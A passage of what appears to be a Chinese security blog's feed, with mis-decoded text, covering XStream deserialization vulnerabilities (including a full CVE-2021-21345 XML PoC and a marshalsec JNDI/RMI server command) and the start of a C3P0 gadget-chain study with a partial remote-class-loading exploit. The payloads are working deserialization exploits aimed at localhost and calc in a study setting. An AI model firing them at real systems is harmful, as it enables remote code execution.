class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">iMatchColumns</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">strMatchColumns</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">strMatchColumns</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">jaxbObject</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">satellites</span>/&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">invocationProperties</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">packet</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">indexMap</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">comparator</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ‰“çš„æ˜¯jndiæ³¨å…¥</p><p>é‚£æˆ‘ä»¬å°±éœ€è¦èµ·ä¸€ä¸ªæ¶æ„çš„rmiæœåŠ¡ï¼Œè¿™é‡Œç”¨marshalsecæ¥èµ·æœåŠ¡</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8888</span>/#exp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106152810804.png" alt="image-20241106152810804"></p><p>webæœåŠ¡ä¸‹æœ‰ä¸€ä¸ªè®¡ç®—å™¨çš„exp.class</p><p><img src="https://cdn.clown2024.cn/image-20241106153040392.png" alt="image-20241106153040392"></p><h2 id="cve-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><p>å½±å“ç‰ˆæœ¬&lt;&#x3D;1.4.15</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">comparator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">indexMap</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">packet</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">bi</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="hljs-tag">&lt;/<span class="hljs-name">jaxbType</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">uriProperties</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">attributeProperties</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">inheritedAttWildcard</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">getter</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>verify<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">getter</span>&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">inheritedAttWildcard</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">bi</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">tagName</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">context</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">marshallerPool</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&#x27;../..&#x27;</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">marshallerPool</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">nameList</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">localNames</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">localNames</span>&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">nameList</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span><br>                  <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">jaxbObject</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">activationCmd</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">activationCmd</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">jaxbObject</span>&gt;</span><br>              <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">satellites</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">invocationProperties</span>/&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">packet</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">indexMap</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">comparator</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106153336587.png" alt="image-20241106153336587"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p><p><a href="https://xz.aliyun.com/t/11372?u_atoken=d255e03184aefd4a575a1a82fa1faa70&u_asig=1a0c399d17307034326662515e00b6&time__1311=n4+xyie7wxg0GODlxGrzGWwxYqGKG8AlD0O+iD">https://xz.aliyun.com/t/11372?u_atoken=d255e03184aefd4a575a1a82fa1faa70&amp;u_asig=1a0c399d17307034326662515e00b6&amp;time__1311=n4%2Bxyie7wxg0GODlxGrzGWwxYqGKG8AlD0O%2BiD</a></p><p>åé¢ç‰ˆæœ¬çš„ä¿®å¤éƒ½æ˜¯é»‘ç™½åå•çš„å½¢å¼æ¥ä¿®å¤ï¼Œè¿™ç¯‡æ–‡ç« æ€»ç»“çš„æ›´åŠ è¯¦ç»†ï¼š<a href="https://tttang.com/archive/1699/">https://tttang.com/archive/1699/</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C3P0åˆ©ç”¨é“¾å­¦ä¹ </title>
      <link href="/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="c3p0ä»‹ç»"><a href="#C3P0ä»‹ç»" class="headerlink" title="C3P0ä»‹ç»"></a>C3P0ä»‹ç»</h1><p>C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateï¼ŒSpringç­‰ã€‚</p><p>JDBCæ˜¯Java DataBase Connectivityçš„ç¼©å†™ï¼Œå®ƒæ˜¯Javaç¨‹åºè®¿é—®æ•°æ®åº“çš„æ ‡å‡†æ¥å£ã€‚<br>ä½¿ç”¨Javaç¨‹åºè®¿é—®æ•°æ®åº“æ—¶ï¼ŒJavaä»£ç å¹¶ä¸æ˜¯ç›´æ¥é€šè¿‡TCPè¿æ¥å»è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡JDBCæ¥å£æ¥è®¿é—®ï¼Œè€ŒJDBCæ¥å£åˆ™é€šè¿‡JDBCé©±åŠ¨æ¥å®ç°çœŸæ­£å¯¹æ•°æ®åº“çš„è®¿é—®ã€‚</p><p>è¿æ¥æ± ç±»ä¼¼äºçº¿ç¨‹æ± ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé¢‘ç¹åœ°æ“ä½œæ•°æ®åº“ï¼Œæ­¤æ—¶Javaåœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šé¢‘ç¹åœ°åˆ›å»ºæˆ–é”€æ¯å¥æŸ„ï¼Œå¢å¤§èµ„æºçš„æ¶ˆè€—ã€‚ä¸ºäº†é¿å…è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æå‰åˆ›å»ºå¥½ä¸€äº›è¿æ¥å¥æŸ„ï¼Œéœ€è¦ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨å¥æŸ„ï¼Œä¸éœ€è¦æ—¶å¯å°†å…¶æ”¾å›è¿æ¥æ± ä¸­ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡çš„ä½¿ç”¨ã€‚ç±»ä¼¼è¿™æ ·ä¸€ç§èƒ½å¤Ÿå¤ç”¨å¥æŸ„çš„æŠ€æœ¯å°±æ˜¯æ± æŠ€æœ¯ã€‚</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.mchange/c3p0 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h1><p>C3P0çš„å¸¸è§åˆ©ç”¨æ–¹å¼æœ‰ä¸‰ç§ï¼š</p><ul><li>URLClassLoaderè¿œç¨‹ç±»åŠ è½½</li><li>JNDIæ³¨å…¥</li><li>åˆ©ç”¨HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</li></ul><h2 id="urlclassloaderè¿œç¨‹ç±»åŠ è½½"><a href="#URLClassLoaderè¿œç¨‹ç±»åŠ è½½" class="headerlink" title="URLClassLoaderè¿œç¨‹ç±»åŠ è½½"></a>URLClassLoaderè¿œç¨‹ç±»åŠ è½½</h2><p>è°ƒç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PoolBackedDataSourceBase#readObject -&gt;<br>ReferenceSerialized#getObject -&gt;<br>ReferenceableUtils#referenceToObject -&gt;<br>ObjectFactory#getObjectInstance<br></code></pre></td></tr></table></figure><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>é¦–å…ˆæ¥çœ‹PoolBackedDataSourceBase#readObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101134337171.png" alt="image-20241101134337171"></p><p>æ¼æ´çš„è§¦å‘å…¥å£å°±åœ¨è¿™ï¼Œå¦‚æœååºåˆ—åŒ–å¾—åˆ°çš„Objectä¸ºIndirectlySerializedï¼Œå°±ä¼šè°ƒç”¨å…¶getObjectæ–¹æ³•</p><p>IndirectlySerializedæ˜¯ä¸€ä¸ªæ¥å£ï¼Œä»–çš„å®ç°ç±»å°±æ˜¯ReferenceSerializedï¼Œé‚£æ¥ä¸‹æ¥å»çœ‹çœ‹ä»–çš„getObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101135245450.png" alt="image-20241101135245450"></p><p>ReferenceSerializedç±»æ˜¯ReferenceIndirectorçš„ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œè€Œä¸”å¯ä»¥çœ‹åˆ°è¿™é‡Œå…¶å®å·²ç»å‡ºç°äº†initialContext.lookupæ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å…¶å®æ˜¯æ— æ³•è°ƒç”¨è¯¥æ–¹æ³•çš„ï¼Œå› ä¸ºcontextNameé»˜è®¤ä¸ºnullä¸”ä¸å¯æ§</p><p>é‚£ç»§ç»­å¾€ä¸‹çœ‹ReferenceableUtils#referenceToObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101135741940.png" alt="image-20241101135741940"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°±åˆ©ç”¨äº†URLClassLoaderæ¥è¿›è¡Œè¿œç¨‹ç±»åŠ è½½ï¼Œåªéœ€è¦æˆ‘ä»¬è®¾ç½®è¿œç¨‹å·¥å‚ç±»åœ°å€<code>fClassLocation</code></p><p>é‚£ç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è¦å¦‚ä½•æ„é€ ReferenceSerializedè¿™ä¸ªç±»å‘¢ï¼Œè¿™ä¸ªç±»ä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜¯ä¸€ä¸ªç§æœ‰çš„ç±»ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥è·å–ï¼Œé‚£å°±çœ‹ä¸€ä¸‹æœ‰è°è°ƒç”¨äº†ä»–çš„æ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101185304051.png" alt="image-20241101185304051"></p><p>å¯ä»¥å‘ç°åœ¨å¤–éƒ¨ç±»ReferenceIndirector#indirectFormæ–¹æ³•é‡Œé¢è¿›è¡Œäº†è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241101185405398.png" alt="image-20241101185405398"></p><p>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬ä¸æ–¹ä¾¿è°ƒç”¨ï¼Œæ‰€ä»¥ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œå‘ç°åœ¨PoolBackedDataSourceBase#writeObjectæ–¹æ³•é‡Œé¢è¿›è¡Œäº†è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ­£å¸¸åºåˆ—åŒ–çš„æµç¨‹ä¸­å°±å¯ä»¥å®Œæˆè¿™ä¸ªæ“ä½œ</p><p><img src="https://cdn.clown2024.cn/image-20241101190429527.png" alt="image-20241101190429527"></p><p>è¿™é‡Œå…¶å®æœ‰ä¸¤ä¸ªindirectFormæ–¹æ³•çš„è°ƒç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬é€‰æ‹©è¿™ä¸ªå‚æ•°ä¸ºConnectionPoolDataSourceçš„æ–¹æ³•</p><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹ä»–èµ°åˆ°è¿™é‡Œçš„é€»è¾‘ï¼Œå¯ä»¥çœ‹åˆ°ä»–å…ˆå°è¯•åºåˆ—åŒ–ConnectionPoolDataSourceï¼Œå¦‚æœæŠ›å‡ºä¸èƒ½ååºåˆ—åŒ–çš„å¼‚å¸¸ï¼Œä»–å°±ä¼šè°ƒç”¨è¿™ä¸ªindirectFormæ–¹æ³•</p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªç±»</p><p><img src="https://cdn.clown2024.cn/image-20241101191307567.png" alt="image-20241101191307567"></p><p>å®ƒæœ¬èº«æ˜¯æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰¾ä¸€ä¸ªä»–çš„å®ç°ç±»ä¸”æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£å°±å¯ä»¥æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œèµ°åˆ°indirectFormæ–¹æ³•çš„é€»è¾‘ï¼Œæˆ–è€…è‡ªå·±å®ç°è¿™ä¸ªæ¥å£ä¹Ÿå¯ä»¥</p><h3 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ " class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><p>é‚£ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œexpçš„ç¼–å†™äº†</p><p>è¿™é‡Œé‡‡ç”¨è‡ªå·±å®ç°ConnectionPoolDataSourceæ¥å£çš„æ–¹æ³•ï¼Œè€Œä¸”è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦è‡ªå·±å®ç°ä¸€ä¸ªReferenceableæ¥å£ï¼Œå› ä¸ºindirectFormæ–¹æ³•é‡Œé¢ä¼ å…¥Referenceå¯¹è±¡çš„æ–¹å¼ä¸å¤ªä¸€æ ·</p><p><img src="https://cdn.clown2024.cn/image-20241101193611019.png" alt="image-20241101193611019"></p><p>è¿™é‡Œæ˜¯è°ƒç”¨ä¸€ä¸ªgetReferenceæ–¹æ³•æ¥è·å–Referenceå¯¹è±¡çš„</p><p>æœ€ç»ˆexpå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0_URLClassloader</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_Loader</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable&#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;ExpClass&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span 